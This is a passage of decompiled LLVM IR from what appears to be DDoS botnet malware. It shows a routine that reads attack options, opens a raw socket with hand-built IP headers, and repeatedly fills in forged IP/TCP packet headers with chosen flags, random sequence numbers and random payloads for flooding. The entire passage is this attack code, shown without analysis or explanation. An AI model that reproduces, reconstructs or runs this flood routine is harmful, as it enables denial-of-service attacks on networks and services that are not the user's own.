  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_bb98, i32* @r6, align 4
  %v0_bbb0 = load i32, i32* @r4, align 4
  store i32 %v0_bbb0, i32* %r0.global-to-local, align 4
  %v4_bbb4 = inttoptr i32 %v0_bba0 to i32*
  %v5_bbb4 = call i32 @attack_get_opt_int(i32 %v0_bbb0, i32* %v4_bbb4, i32 7, i32 65535)
  %v0_bbbc = load i32, i32* @r5, align 4
  store i32 %v0_bbbc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_bbb4, i32* @sl, align 4
  %v0_bbcc = load i32, i32* @r4, align 4
  store i32 %v0_bbcc, i32* %r0.global-to-local, align 4
  %v4_bbd0 = inttoptr i32 %v0_bbbc to i32*
  %v5_bbd0 = call i32 @attack_get_opt_int(i32 %v0_bbcc, i32* %v4_bbd0, i32 17, i32 65535)
  %v0_bbdc = load i32, i32* @r5, align 4
  store i32 %v0_bbdc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_bbe8 = load i32, i32* @r4, align 4
  store i32 %v0_bbe8, i32* %r0.global-to-local, align 4
  %v5_bbec = inttoptr i32 %v0_bbdc to i32*
  %v6_bbec = call i32 @attack_get_opt_int(i32 %v0_bbe8, i32* %v5_bbec, i32 18, i32 65535)
  %v0_bbf0 = load i32, i32* @r5, align 4
  store i32 %v0_bbf0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc00 = load i32, i32* @r4, align 4
  store i32 %v0_bc00, i32* %r0.global-to-local, align 4
  %v5_bc04 = inttoptr i32 %v0_bbf0 to i32*
  %v6_bc04 = call i32 @attack_get_opt_int(i32 %v0_bc00, i32* %v5_bc04, i32 11, i32 0)
  %v0_bc08 = load i32, i32* @r5, align 4
  store i32 %v0_bc08, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bc18 = load i32, i32* @r4, align 4
  store i32 %v0_bc18, i32* %r0.global-to-local, align 4
  %v5_bc1c = inttoptr i32 %v0_bc08 to i32*
  %v6_bc1c = call i32 @attack_get_opt_int(i32 %v0_bc18, i32* %v5_bc1c, i32 12, i32 1)
  %v0_bc20 = load i32, i32* @r5, align 4
  store i32 %v0_bc20, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc30 = load i32, i32* @r4, align 4
  store i32 %v0_bc30, i32* %r0.global-to-local, align 4
  %v5_bc34 = inttoptr i32 %v0_bc20 to i32*
  %v6_bc34 = call i32 @attack_get_opt_int(i32 %v0_bc30, i32* %v5_bc34, i32 13, i32 0)
  %v0_bc38 = load i32, i32* @r5, align 4
  store i32 %v0_bc38, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc48 = load i32, i32* @r4, align 4
  store i32 %v0_bc48, i32* %r0.global-to-local, align 4
  %v5_bc4c = inttoptr i32 %v0_bc38 to i32*
  %v6_bc4c = call i32 @attack_get_opt_int(i32 %v0_bc48, i32* %v5_bc4c, i32 14, i32 0)
  %v0_bc50 = load i32, i32* @r5, align 4
  store i32 %v0_bc50, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc60 = load i32, i32* @r4, align 4
  store i32 %v0_bc60, i32* %r0.global-to-local, align 4
  %v5_bc64 = inttoptr i32 %v0_bc50 to i32*
  %v6_bc64 = call i32 @attack_get_opt_int(i32 %v0_bc60, i32* %v5_bc64, i32 15, i32 0)
  %v0_bc68 = load i32, i32* @r5, align 4
  store i32 %v0_bc68, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc78 = load i32, i32* @r4, align 4
  store i32 %v0_bc78, i32* %r0.global-to-local, align 4
  %v5_bc7c = inttoptr i32 %v0_bc68 to i32*
  %v6_bc7c = call i32 @attack_get_opt_int(i32 %v0_bc78, i32* %v5_bc7c, i32 16, i32 0)
  %v0_bc80 = load i32, i32* @r5, align 4
  store i32 %v0_bc80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_bc90 = load i32, i32* @r4, align 4
  store i32 %v0_bc90, i32* %r0.global-to-local, align 4
  %v5_bc94 = inttoptr i32 %v0_bc80 to i32*
  %v6_bc94 = call i32 @attack_get_opt_int(i32 %v0_bc90, i32* %v5_bc94, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bca4 = load i32, i32* @r5, align 4
  store i32 %v0_bca4, i32* %r1.global-to-local, align 4
  %v0_bca8 = load i32, i32* @r4, align 4
  store i32 %v0_bca8, i32* %r0.global-to-local, align 4
  %v4_bcac = inttoptr i32 %v0_bca4 to i32*
  %v5_bcac = call i32 @attack_get_opt_int(i32 %v0_bca8, i32* %v4_bcac, i32 1, i32 1)
  %v2_bcb8 = load i32, i32* @global_var_243d0.55, align 4
  store i32 %v2_bcb8, i32* %r3.global-to-local, align 4
  %v1_bcbc = urem i32 %v5_bcac, 256
  store i32 %v1_bcbc, i32* %ip.global-to-local, align 4
  %v0_bcc0 = load i32, i32* @r5, align 4
  store i32 %v0_bcc0, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_bcc8 = load i32, i32* @r4, align 4
  store i32 %v0_bcc8, i32* %r0.global-to-local, align 4
  %v5_bcd0 = inttoptr i32 %v0_bcc0 to i32*
  %v6_bcd0 = call i32 @attack_get_opt_ip(i32 %v0_bcc8, i32* %v5_bcd0, i32 25, i32 %v2_bcb8, i32 %v1_bcbc)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_bce4 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v7_bce8 = icmp eq i32 %v3_bce4, -1
  store i1 %v7_bce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bce8, label %dec_label_pc_c1b0, label %dec_label_pc_bcf4

dec_label_pc_bcf4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bcfc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bcfc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bd10 = call i32 @__GI_setsockopt(i32 %v3_bce4, i32 0, i32 3, i32 %v6_bcfc, i32 4)
  store i32 %v5_bd10, i32* %r0.global-to-local, align 4
  %v7_bd14 = icmp eq i32 %v5_bd10, -1
  store i1 %v7_bd14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bd14, label %dec_label_pc_c1a8, label %dec_label_pc_bd1c

dec_label_pc_bd1c:                                ; preds = %dec_label_pc_bcf4
  %v0_bd1c = load i32, i32* %sb.global-to-local, align 4
  %v3_bd1c = mul i32 %v0_bd1c, 65536
  store i32 %v3_bd1c, i32* @r5, align 4
  %v0_bd20 = load i32, i32* @r6, align 4
  %v0_bd24 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_bd2c = urem i32 %v0_bd1c, 65536
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  %v3_bd30 = urem i32 %v0_bd20, 65536
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v3_bd34 = urem i32 %v0_bd24, 65536
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v0_bd38 = load i32, i32* @r7, align 4
  %v2_bd38 = icmp eq i32 %v0_bd38, 0
  store i1 %v2_bd38, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bd38, label %dec_label_pc_c1bc, label %dec_label_pc_bd50

dec_label_pc_bd50:                                ; preds = %dec_label_pc_bd1c
  %v3_bd54 = mul i32 %v6_bc94, 65536
  %v1_bd58 = add i32 %v3_bd54, 2621440
  store i32 %v1_bd58, i32* @lr, align 4
  %tmp59 = mul i32 %v0_bd20, 256
  %v3_bd7c = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_bd24, 256
  %v3_bd80 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_bd20, 256
  %v4_bd84 = urem i32 %tmp61, 256
  %v5_bd84 = or i32 %v4_bd84, %v3_bd7c
  store i32 %v5_bd84, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_bd24, 256
  %v4_bd88 = urem i32 %tmp62, 256
  %v5_bd88 = or i32 %v4_bd88, %v3_bd80
  store i32 %v5_bd88, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_bd58, 256
  %v3_bd9c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_bd1c, 256
  %v3_bda0 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v5_bbd0, 256
  %v3_bda4 = and i32 %tmp65, 65280
  %v1_bda8 = urem i32 %v6_bc04, 2
  %v1_bdac = urem i32 %v6_bc1c, 2
  %tmp66 = udiv i32 %v5_bbd0, 256
  %v4_bdb0 = urem i32 %tmp66, 256
  %v5_bdb0 = or i32 %v4_bdb0, %v3_bda4
  %v4_bdb4 = udiv i32 %v1_bd58, 16777216
  %v5_bdb4 = or i32 %v3_bd9c, %v4_bdb4
  store i32 %v5_bdb4, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_bd1c, 256
  %v4_bdb8 = urem i32 %tmp67, 256
  %v5_bdb8 = or i32 %v4_bdb8, %v3_bda0
  store i32 %v5_bdb8, i32* @fp, align 4
  %v1_bdd4 = urem i32 %v6_bc34, 2
  store i32 %v1_bdd4, i32* %r2.global-to-local, align 4
  %v1_bdd8 = urem i32 %v6_bc4c, 2
  store i32 %v1_bdd8, i32* %r3.global-to-local, align 4
  %v1_bddc = urem i32 %v6_bc64, 2
  store i32 %v1_bddc, i32* %ip.global-to-local, align 4
  %v1_bde0 = urem i32 %v6_bc7c, 2
  store i32 %v1_bde0, i32* %r0.global-to-local, align 4
  %v1_bde4 = urem i32 %v6_bc34, 256
  store i32 %v1_bde4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul i32 %v6_bb18, 16777216
  %v4_be58 = sdiv i32 %sext, 16777216
  %sext3 = mul i32 %v5_bb54, 16777216
  %v4_be64 = sdiv i32 %sext3, 16777216
  %tmp = sub nsw i32 0, %v1_bdac
  %v4_bed0 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_bdd4
  %v4_beec = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_bdd8
  %v4_bf00 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_bddc
  %v3_bf14 = and i32 %tmp74, 2
  %v2_bf38 = icmp eq i32 %v1_bde4, 0
  %v1_be60 = trunc i32 %v4_be58 to i8
  %extract.t = trunc i32 %v4_be64 to i8
  br label %dec_label_pc_be04

dec_label_pc_be04:                                ; preds = %bb70, %dec_label_pc_bd50
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_be10 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_be10, i32* %r0.global-to-local, align 4
  %v2_be18 = load i32, i32* @r4, align 4
  %v5_be18 = mul i32 %v2_be18, 4
  %v6_be18 = add i32 %v5_be18, %v2_bb00
  %v7_be18 = inttoptr i32 %v6_be18 to i32*
  store i32 %v2_be10, i32* %v7_be18, align 4
  %v3_be1c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_be1c, i32* %r2.global-to-local, align 4
  %v5_be24 = mul i32 %v3_be1c, 24
  %v1_be28 = load i32, i32* @r8, align 4
  %v2_be28 = add i32 %v1_be28, %v5_be24
  store i32 %v2_be28, i32* %r1.global-to-local, align 4
  store i32 %v2_bb00, i32* %r3.global-to-local, align 4
  %v4_be30 = mul i32 %v3_be1c, 4
  %v5_be30 = add i32 %v4_be30, %v2_bb00
  %v6_be30 = inttoptr i32 %v5_be30 to i32*
  %v7_be30 = load i32, i32* %v6_be30, align 4
  store i32 %v7_be30, i32* @r5, align 4
  %v1_be34 = inttoptr i32 %v7_be30 to i8*
  %v2_be34 = load i8, i8* %v1_be34, align 1
  %tmp75 = urem i8 %v2_be34, 16
  %v1_be38 = zext i8 %tmp75 to i32
  %v1_be3c = or i32 %v1_be38, 64
  store i32 %v1_be3c, i32* %r3.global-to-local, align 4
  %v1_be40 = trunc i32 %v1_be3c to i8
  store i8 %v1_be40, i8* %v1_be34, align 1
  %v0_be44 = load i32, i32* @r5, align 4
  %v1_be44 = inttoptr i32 %v0_be44 to i8*
  %v2_be44 = load i8, i8* %v1_be44, align 1
  %v1_be48 = and i8 %v2_be44, -16
  %v1_be4c = or i8 %v1_be48, 5
  store i32 %v1_bb80, i32* %ip.global-to-local, align 4
  store i8 %v1_be4c, i8* %v1_be44, align 1
  store i32 %v4_be58, i32* %r0.global-to-local, align 4
  %v0_be5c = load i32, i32* %ip.global-to-local, align 4
  %v2_be5c = icmp eq i32 %v0_be5c, 0
  store i1 %v2_be5c, i1* %cpsr_z.global-to-local, align 1
  %v2_be60 = load i32, i32* @r5, align 4
  %v3_be60 = add i32 %v2_be60, 1
  %v4_be60 = inttoptr i32 %v3_be60 to i8*
  store i8 %v1_be60, i8* %v4_be60, align 1
  store i32 %v4_be64, i32* %r2.global-to-local, align 4
  %v0_be68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_be68, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_be04
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_be6c = load i32, i32* @r5, align 4
  %v4_be6c = add i32 %v3_be6c, 6
  %v5_be6c = inttoptr i32 %v4_be6c to i16*
  store i16 64, i16* %v5_be6c, align 2
  %v0_be74.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_be74.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_be04, %bb
  %v0_be74.off0 = phi i8 [ %extract.t, %dec_label_pc_be04 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_be74 = load i32, i32* @r5, align 4
  %v3_be74 = add i32 %v2_be74, 8
  %v4_be74 = inttoptr i32 %v3_be74 to i8*
  store i8 %v0_be74.off0, i8* %v4_be74, align 1
  %v0_be78 = load i32, i32* %r3.global-to-local, align 4
  %v1_be78 = trunc i32 %v0_be78 to i8
  %v2_be78 = load i32, i32* @r5, align 4
  %v3_be78 = add i32 %v2_be78, 9
  %v4_be78 = inttoptr i32 %v3_be78 to i8*
  store i8 %v1_be78, i8* %v4_be78, align 1
  store i32 %v6_bcd0, i32* %ip.global-to-local, align 4
  %v1_be80 = load i32, i32* @r5, align 4
  %v2_be80 = add i32 %v1_be80, 12
  %v3_be80 = inttoptr i32 %v2_be80 to i32*
  store i32 %v6_bcd0, i32* %v3_be80, align 4
  %v0_be84 = load i32, i32* %r1.global-to-local, align 4
  %v1_be84 = add i32 %v0_be84, 16
  %v2_be84 = inttoptr i32 %v1_be84 to i32*
  %v3_be84 = load i32, i32* %v2_be84, align 4
  store i32 %v3_be84, i32* %r3.global-to-local, align 4
  %v0_be88 = load i32, i32* @sb, align 4
  %v1_be88 = trunc i32 %v0_be88 to i16
  %v2_be88 = load i32, i32* @r5, align 4
  %v3_be88 = add i32 %v2_be88, 2
  %v4_be88 = inttoptr i32 %v3_be88 to i16*
  store i16 %v1_be88, i16* %v4_be88, align 2
  %v0_be8c = load i32, i32* @fp, align 4
  %v1_be8c = trunc i32 %v0_be8c to i16
  %v2_be8c = load i32, i32* @r5, align 4
  %v3_be8c = add i32 %v2_be8c, 4
  %v4_be8c = inttoptr i32 %v3_be8c to i16*
  store i16 %v1_be8c, i16* %v4_be8c, align 2
  %v0_be90 = load i32, i32* %r3.global-to-local, align 4
  %v1_be90 = load i32, i32* @r5, align 4
  %v2_be90 = add i32 %v1_be90, 16
  %v3_be90 = inttoptr i32 %v2_be90 to i32*
  store i32 %v0_be90, i32* %v3_be90, align 4
  %v0_be94 = load i32, i32* @r6, align 4
  %v1_be94 = trunc i32 %v0_be94 to i16
  %v2_be94 = load i32, i32* @r5, align 4
  %v3_be94 = add i32 %v2_be94, 20
  %v4_be94 = inttoptr i32 %v3_be94 to i16*
  store i16 %v1_be94, i16* %v4_be94, align 2
  %v0_be98 = load i32, i32* @r5, align 4
  %v1_be98 = add i32 %v0_be98, 20
  store i32 %v1_be98, i32* @r4, align 4
  %v1_be9c = add i32 %v0_be98, 32
  %v2_be9c = inttoptr i32 %v1_be9c to i8*
  %v3_be9c = load i8, i8* %v2_be9c, align 1
  %v4_be9c = zext i8 %v3_be9c to i32
  store i32 %v4_be9c, i32* %r3.global-to-local, align 4
  %v1_bea0 = add i32 %v0_be98, 33
  %v2_bea0 = inttoptr i32 %v1_bea0 to i8*
  %v3_bea0 = load i8, i8* %v2_bea0, align 1
  %v4_bea0 = zext i8 %v3_bea0 to i32
  store i32 %v1_bda8, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_be9c, 16
  %v1_bea8 = zext i8 %tmp76 to i32
  %v1_beac = or i32 %v1_bea8, 80
  store i32 %v1_beac, i32* %r3.global-to-local, align 4
  %v1_beb0 = and i32 %v4_bea0, 223
  store i32 %v1_beb0, i32* %r2.global-to-local, align 4
  %v1_beb4 = trunc i32 %v1_beac to i8
  store i8 %v1_beb4, i8* %v2_be9c, align 1
  %v0_beb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_beb8 = load i32, i32* %r0.global-to-local, align 4
  %v4_beb8 = mul i32 %v1_beb8, 32
  %v5_beb8 = or i32 %v4_beb8, %v0_beb8
  store i32 %v5_beb8, i32* %r2.global-to-local, align 4
  store i32 %v5_bdb0, i32* %r1.global-to-local, align 4
  %v1_bec0 = trunc i32 %v5_beb8 to i8
  %v2_bec0 = load i32, i32* @r4, align 4
  %v3_bec0 = add i32 %v2_bec0, 13
  %v4_bec0 = inttoptr i32 %v3_bec0 to i8*
  store i8 %v1_bec0, i8* %v4_bec0, align 1
  %v0_bec4 = load i32, i32* @r4, align 4
  %v1_bec4 = add i32 %v0_bec4, 13
  %v2_bec4 = inttoptr i32 %v1_bec4 to i8*
  %v3_bec4 = load i8, i8* %v2_bec4, align 1
  %v4_bec4 = zext i8 %v3_bec4 to i32
  store i32 %v1_bdac, i32* %r2.global-to-local, align 4
  %v1_becc = and i32 %v4_bec4, 239
  %v5_bed0 = or i32 %v1_becc, %v4_bed0
  store i32 %v5_bed0, i32* %r3.global-to-local, align 4
  %v0_bed4 = load i32, i32* %r1.global-to-local, align 4
  %v2_bed4 = add i32 %v0_bec4, 4
  %v3_bed4 = inttoptr i32 %v2_bed4 to i32*
  store i32 %v0_bed4, i32* %v3_bed4, align 4
  %v0_bed8 = load i32, i32* @sl, align 4
  %v1_bed8 = trunc i32 %v0_bed8 to i16
  %v2_bed8 = load i32, i32* @r4, align 4
  %v3_bed8 = add i32 %v2_bed8, 2
  %v4_bed8 = inttoptr i32 %v3_bed8 to i16*
  store i16 %v1_bed8, i16* %v4_bed8, align 2
  %v0_bedc = load i32, i32* %r3.global-to-local, align 4
  %v1_bedc = trunc i32 %v0_bedc to i8
  %v2_bedc = load i32, i32* @r4, align 4
  %v3_bedc = add i32 %v2_bedc, 13
  %v4_bedc = inttoptr i32 %v3_bedc to i8*
  store i8 %v1_bedc, i8* %v4_bedc, align 1
  %v0_bee0 = load i32, i32* @r4, align 4
  %v1_bee0 = add i32 %v0_bee0, 13
  %v2_bee0 = inttoptr i32 %v1_bee0 to i8*
  %v3_bee0 = load i8, i8* %v2_bee0, align 1
  %v4_bee0 = zext i8 %v3_bee0 to i32
  store i32 %v1_bdd4, i32* %r3.global-to-local, align 4
  %v1_bee8 = and i32 %v4_bee0, 247
  %v5_beec = or i32 %v1_bee8, %v4_beec
  store i32 %v5_beec, i32* %r2.global-to-local, align 4
  %v1_bef0 = trunc i32 %v5_beec to i8
  store i8 %v1_bef0, i8* %v2_bee0, align 1
  %v0_bef4 = load i32, i32* @r4, align 4
  %v1_bef4 = add i32 %v0_bef4, 13
  %v2_bef4 = inttoptr i32 %v1_bef4 to i8*
  %v3_bef4 = load i8, i8* %v2_bef4, align 1
  %v4_bef4 = zext i8 %v3_bef4 to i32
  store i32 %v1_bdd8, i32* %ip.global-to-local, align 4
  %v1_befc = and i32 %v4_bef4, 251
  %v5_bf00 = or i32 %v1_befc, %v4_bf00
  store i32 %v5_bf00, i32* %r3.global-to-local, align 4
  %v1_bf04 = trunc i32 %v5_bf00 to i8
  store i8 %v1_bf04, i8* %v2_bef4, align 1
  %v0_bf08 = load i32, i32* @r4, align 4
  %v1_bf08 = add i32 %v0_bf08, 13
  %v2_bf08 = inttoptr i32 %v1_bf08 to i8*
  %v3_bf08 = load i8, i8* %v2_bf08, align 1
  %v4_bf08 = zext i8 %v3_bf08 to i32
  store i32 %v1_bddc, i32* %r0.global-to-local, align 4
  %v1_bf10 = and i32 %v4_bf08, 253
  %v4_bf14 = or i32 %v1_bf10, %v3_bf14
  store i32 %v4_bf14, i32* %r2.global-to-local, align 4
  %v1_bf18 = trunc i32 %v4_bf14 to i8
  store i8 %v1_bf18, i8* %v2_bf08, align 1
  %v0_bf1c = load i32, i32* @r4, align 4
  %v1_bf1c = add i32 %v0_bf1c, 13
  %v2_bf1c = inttoptr i32 %v1_bf1c to i8*
  %v3_bf1c = load i8, i8* %v2_bf1c, align 1
  %v4_bf1c = zext i8 %v3_bf1c to i32
  store i32 %v1_bde0, i32* %r1.global-to-local, align 4
  %v1_bf24 = and i32 %v4_bf1c, 254
  %v2_bf28 = or i32 %v1_bf24, %v1_bde0
  store i32 %v2_bf28, i32* %r3.global-to-local, align 4
  %v1_bf2c = trunc i32 %v2_bf28 to i8
  store i8 %v1_bf2c, i8* %v2_bf1c, align 1
  %v0_bf30 = call i32 @rand_next()
  %v1_bf30 = trunc i32 %v0_bf30 to i16
  store i32 %v0_bf30, i32* %r0.global-to-local, align 4
  store i32 %v1_bde4, i32* %r2.global-to-local, align 4
  store i1 %v2_bf38, i1* %cpsr_z.global-to-local, align 1
  %v3_bf44.pre = load i32, i32* @r4, align 4
  br i1 %v2_bf38, label %.thread4, label %bb68

bb68:                                             ; preds = %.thread
  %v2_bf3c = add i32 %v3_bf44.pre, 13
  %v3_bf3c = inttoptr i32 %v2_bf3c to i8*
  %v4_bf3c = load i8, i8* %v3_bf3c, align 1
  %v5_bf3c = zext i8 %v4_bf3c to i32
  %v2_bf40 = or i32 %v5_bf3c, 8
  store i32 %v2_bf40, i32* @r3, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread, %bb68
  %v4_bf44 = add i32 %v3_bf44.pre, 14
  %v5_bf44 = inttoptr i32 %v4_bf44 to i16*
  store i16 %v1_bf30, i16* %v5_bf44, align 2
  store i32 %v6_bc94, i32* %r1.global-to-local, align 4
  %v0_bf4c = load i32, i32* @r5, align 4
  %v1_bf4c = add i32 %v0_bf4c, 40
  store i32 %v1_bf4c, i32* %r0.global-to-local, align 4
  br i1 %v2_bf38, label %bb70, label %bb69

bb69:                                             ; preds = %.thread4
  %v1_bf50 = load i32, i32* @r3, align 4
  %v2_bf50 = trunc i32 %v1_bf50 to i8
  %v3_bf50 = load i32, i32* @r4, align 4
  %v4_bf50 = add i32 %v3_bf50, 13
  %v5_bf50 = inttoptr i32 %v4_bf50 to i8*
  store i8 %v2_bf50, i8* %v5_bf50, align 1
  br label %bb70

bb70:                                             ; preds = %.thread4, %bb69
  %v2_bf54 = inttoptr i32 %v1_bf4c to i16*
  %v3_bf54 = call i32 @rand_str(i16* %v2_bf54, i32 %v6_bc94)
  store i32 %v3_bf54, i32* %r0.global-to-local, align 4
  %v3_bf58 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf58, i32* %r3.global-to-local, align 4
  %v1_bf5c = add i32 %v3_bf58, 1
  store i32 %v1_bf5c, i32* @r4, align 4
  %v1_bf60 = load i32, i32* @r7, align 4
  %v9_bf60 = icmp eq i32 %v1_bf5c, %v1_bf60
  store i1 %v9_bf60, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bf5c, i32* %stack_var_-44, align 4
  %v5_bf68 = icmp slt i32 %v1_bf5c, %v1_bf60
  br i1 %v5_bf68, label %dec_label_pc_be04, label %dec_label_pc_bf6c

dec_label_pc_bf6c:                                ; preds = %bb70
  store i32 %v6_bc94, i32* %r3.global-to-local, align 4
  %v1_bf70 = add i32 %v6_bc94, 20
  store i32 %v1_bf70, i32* @sb, align 4
  br label %dec_label_pc_bf78

dec_label_pc_bf78:                                ; preds = %dec_label_pc_c1bc, %dec_label_pc_bf6c
  %v0_bf908 = phi i32 [ %v1_bf60, %dec_label_pc_bf6c ], [ 0, %dec_label_pc_c1bc ]
  %stack_var_-140.0 = phi i32 [ %v3_bd54, %dec_label_pc_bf6c ], [ %v3_c1c8, %dec_label_pc_c1bc ]
  %storemerge = add i32 %v6_bc94, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_bf7c = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_bf7c, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_bf7c, 256
  %v3_bf84 = and i32 %tmp71, 65280
  store i32 %v3_bf84, i32* %r3.global-to-local, align 4
  %v4_bf88 = udiv i32 %v1_bf7c, 16777216
  %v5_bf88 = or i32 %v3_bf84, %v4_bf88
  store i32 %v5_bf88, i32* @sl, align 4
  %v3_c128 = icmp eq i32 %v3_bd2c, 65535
  %v2_c18c = icmp eq i32 %v1_bcbc, 0
  %v2_bfc8 = icmp eq i32 %v6_bcd0, -1
  %v7_bfc8 = icmp eq i32 %v6_bcd0, -1
  br label %dec_label_pc_bf8c

dec_label_pc_bf8c:                                ; preds = %dec_label_pc_bf8c, %dec_label_pc_c0a4, %dec_label_pc_bf78
  %v0_bf90 = phi i32 [ %v0_bf908, %dec_label_pc_bf78 ], [ 0, %dec_label_pc_c0a4 ], [ 0, %dec_label_pc_bf8c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bf90 = icmp eq i32 %v0_bf90, 0
  store i1 %v2_bf90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bf90, label %dec_label_pc_bf8c, label %dec_label_pc_bf9c

dec_label_pc_bf9c:                                ; preds = %dec_label_pc_bf8c, %dec_label_pc_c0a4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bfa0

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_c020, %dec_label_pc_bf9c
  %v1_bfb4 = phi i32 [ %v1_c094, %dec_label_pc_c020 ], [ 0, %dec_label_pc_bf9c ]
  %v5_bfa4 = mul i32 %v1_bfb4, 24
  %v1_bfa8 = load i32, i32* @r8, align 4
  %v2_bfa8 = add i32 %v1_bfa8, %v5_bfa4
  store i32 %v2_bfa8, i32* %r3.global-to-local, align 4
  store i32 %v2_bb00, i32* %ip.global-to-local, align 4
  %v1_bfb0 = add i32 %v2_bfa8, 20
  %v2_bfb0 = inttoptr i32 %v1_bfb0 to i8*
  %v3_bfb0 = load i8, i8* %v2_bfb0, align 1
  %v4_bfb0 = zext i8 %v3_bfb0 to i32
  store i32 %v4_bfb0, i32* %r2.global-to-local, align 4
  %v4_bfb4 = mul i32 %v1_bfb4, 4
  %v5_bfb4 = add i32 %v4_bfb4, %v2_bb00
  %v6_bfb4 = inttoptr i32 %v5_bfb4 to i32*
  %v7_bfb4 = load i32, i32* %v6_bfb4, align 4
  store i32 %v7_bfb4, i32* @r5, align 4
  %v7_bfb8 = icmp eq i8 %v3_bfb0, 31
  store i1 %v7_bfb8, i1* %cpsr_z.global-to-local, align 1
  %v1_bfbc = add i32 %v7_bfb4, 20
  store i32 %v1_bfbc, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_bfb0, 32
  br i1 %tmp77, label %dec_label_pc_c0b8, label %dec_label_pc_bfc4

dec_label_pc_bfc4:                                ; preds = %dec_label_pc_bfa0
  store i32 %v6_bcd0, i32* %r0.global-to-local, align 4
  store i1 %v7_bfc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bfc8, label %dec_label_pc_c118, label %dec_label_pc_bfd0

dec_label_pc_bfd0:                                ; preds = %dec_label_pc_c0b8, %dec_label_pc_bfc4
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c128, label %dec_label_pc_c134, label %dec_label_pc_bfe4

dec_label_pc_bfe4:                                ; preds = %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge, %dec_label_pc_bfd0
  %v1_bfe8 = phi i32 [ %v1_bfe8.pre, %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge ], [ 65535, %dec_label_pc_bfd0 ]
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v9_bfe8 = icmp eq i32 %v3_bd30, %v1_bfe8
